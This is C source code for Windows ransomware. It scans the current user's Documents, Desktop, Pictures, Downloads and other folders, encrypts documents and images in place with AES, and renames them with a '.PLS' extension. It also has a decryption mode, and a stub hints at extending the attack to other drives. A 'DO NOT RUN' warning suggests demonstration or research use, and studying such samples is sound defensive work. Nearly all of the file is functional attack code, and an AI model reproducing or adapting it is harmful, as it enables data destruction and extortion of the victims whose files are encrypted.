#include <Windows.h>
#include <stdio.h>

#include "mgEncryption.h"

#define EXTENTION_SIZE	4
#define RANSON_EXT_NAME "PLS"




char* getExtention(char* inputStr, int sizeStr) {
	int i = 0;
	for (i = sizeStr; i > 0 && inputStr[i] != '.'; i--);
	return inputStr + i + 1; //  +1 to remove '.'
}

BOOL RenameFile(char* filePath, BOOL setExtention) {
	int sizeStr = (int)strlen(filePath);

	if (sizeStr > EXTENTION_SIZE) {
		char* newFilePath = (char*)calloc(MAX_PATH, 1);
		if (newFilePath != NULL) {
			const char* targetExtention = RANSON_EXT_NAME;

			if (strcmp(getExtention(filePath, sizeStr), targetExtention) == 0 && !setExtention) {
				strncpy_s(newFilePath, MAX_PATH, filePath, sizeStr - EXTENTION_SIZE);
				printf("Extention reset: %s\n", newFilePath);
				rename(filePath, newFilePath);
				free(newFilePath);
				return TRUE;
			}else if (strcmp(getExtention(filePath, sizeStr), targetExtention) != 0 && setExtention) {
				sprintf_s(newFilePath, MAX_PATH, "%s.%s", filePath, targetExtention);
				printf("Extention set: %s\n", newFilePath);
				rename(filePath, newFilePath);
				free(newFilePath);
				return TRUE;
			}
			free(newFilePath);
		}		
	}
	return FALSE;
}

BOOL checkForTargetExt(char* path) {
	const char* TargetExt[] = {
		RANSON_EXT_NAME,
		"txt",
		"html",
		"pdf",
		"doc",
		"docx",
		"jpg",
		"png",
		"bmp"
	};
	int i = 0;
	int sizeStr = (int)strlen(path);
	char* extention = getExtention(path, sizeStr);

	for (; i < sizeof(TargetExt) / sizeof(char*) && strcmp(extention, TargetExt[i]) != 0; i++);
	return i < sizeof(TargetExt) / sizeof(char*) && strcmp(extention, TargetExt[i]) == 0;
}

BOOL MgFile(char* rsaKey, char* path, BOOL isEncryptingSys) {
	int sizeStr = (int)strlen(path);
	if (!checkForTargetExt(path))
		return FALSE;

	HANDLE hFile = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile != INVALID_HANDLE_VALUE) {
		DWORD fileSize = GetFileSize(hFile, NULL);
		if (fileSize > 0) {
			char* fileData = (char*)calloc(fileSize + 1, 1);
			DWORD dwBytesRead;
			printf("path: %s (size: %i)\n", path, (int)fileSize);
			if (fileData != NULL) {
				if (ReadFile(hFile, fileData, fileSize, &dwBytesRead, NULL)) {
					char* outputData = NULL;
					BOOL succedCryptData = FALSE;

					SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
					if (isEncryptingSys && strcmp(getExtention(path, sizeStr), RANSON_EXT_NAME) != 0) {
						printf("!!!!!!!!!!!!!!!! DO NOT RUN !!!!!!!!!!!!!!!!\n");
						//system("pause>nul");
						succedCryptData = EncryptionBlockAES(rsaKey, fileData, dwBytesRead, &outputData);
					}else if(strcmp(getExtention(path, sizeStr), RANSON_EXT_NAME) == 0)
						succedCryptData = DecryptionBlockAES(rsaKey, fileData, dwBytesRead, &outputData);

					if (succedCryptData && outputData != NULL) {
						DWORD cbWritten = 0;

						printf("[STATUS] %s\n", succedCryptData ? "OK" : "ERROR");
						WriteFile(hFile, outputData, dwBytesRead, &cbWritten, NULL);


						free(outputData);
						CloseHandle(hFile);
						RenameFile(path, isEncryptingSys);
					}else {
						printf("[X] Fail to mg the file %s !\n", path);
						CloseHandle(hFile);
					}
					free(fileData);
					return succedCryptData;
				}
				free(fileData);
			}
		}else
			printf("File error !\n");
		CloseHandle(hFile);
	}else
		printf("[X] Fail to open the file !\n");
	return FALSE;
}



BOOL scanDirectory(char* rsaKey, char* path, BOOL clearSystem) {
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;
	char* currentDirPath = (char*)calloc(MAX_PATH, 1);
	if (currentDirPath == NULL)
		return FALSE;

	sprintf_s(currentDirPath, MAX_PATH, "%s\\*", path);
	hFind = FindFirstFileA(currentDirPath, &FindFileData);
	free(currentDirPath);

	if (hFind == INVALID_HANDLE_VALUE) {
		printf("FindFirstFile failed (%d)\n", GetLastError());
	}
	else {
		do {
			if (strcmp(FindFileData.cFileName, ".") != 0 &&
				strcmp(FindFileData.cFileName, "..") != 0) {
				char newPath[MAX_PATH];
				sprintf_s(newPath, MAX_PATH, "%s\\%s", path, FindFileData.cFileName);

				if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
					scanDirectory(rsaKey, newPath, clearSystem);
					printf("%s\n", newPath);
				}else {
					MgFile(rsaKey, newPath, clearSystem); // BOOL isSucced = 
				}
			}
		} while (FindNextFileA(hFind, &FindFileData) != 0);
		FindClose(hFind);
	}
	return FALSE;
}



VOID ScanMainDisk(char* aesKey, char* driveLetter, BOOL clearSystem) {
	char *userName = (char*)calloc(MAX_PATH, 1);

	if (userName != NULL) {
		DWORD sizeOutput = MAX_PATH;

		if (GetUserNameA(userName, &sizeOutput)) {
			char* myDocuments = (char*)calloc(MAX_PATH, 1);

			if (myDocuments != NULL) {
				const char* tabTargetPath[] = {
					"Documents",
					"Desktop",
					"Music",
					"Pictures",
					"Videos",
					"Downloads",
				};

				for (int i = 0; i < sizeof(tabTargetPath) / sizeof(char*); i++) {
					sprintf_s(myDocuments, MAX_PATH, "%sUsers\\%s\\%s", driveLetter, userName, tabTargetPath[i]);
					printf("%s\n", myDocuments);
					scanDirectory(aesKey, myDocuments, clearSystem); // thread 
				}
				free(myDocuments);
			}
		}
		free(userName);
	}
}


BOOL ScanSystem(char* aesKey, BOOL clearSystem) {
	char systemDrive[MAX_PATH];
	
	DWORD myDrivesBitMask = GetLogicalDrives();

	if (!GetSystemDirectoryA(systemDrive, MAX_PATH))
		return FALSE;
	sprintf_s(systemDrive, MAX_PATH, "%c:\\", systemDrive[0]);


	if (myDrivesBitMask == 0)
		printf("GetLogicalDrives() failed with error code: %d\n", GetLastError());
	else {
		char driveLetter[] = "A:\\";
		
		while (myDrivesBitMask) {
			if (myDrivesBitMask & 1) {
				printf("drive %s\n", driveLetter);
				if (strcmp(systemDrive, driveLetter) == 0) {
					ScanMainDisk(aesKey, driveLetter, clearSystem);
				}else {
					// Encryption other Drive !!!!
					// EncryptionRoute(driveLetter);
				}
			}
			driveLetter[0]++;
			myDrivesBitMask >>= 1;
		}
	}
	return TRUE;
}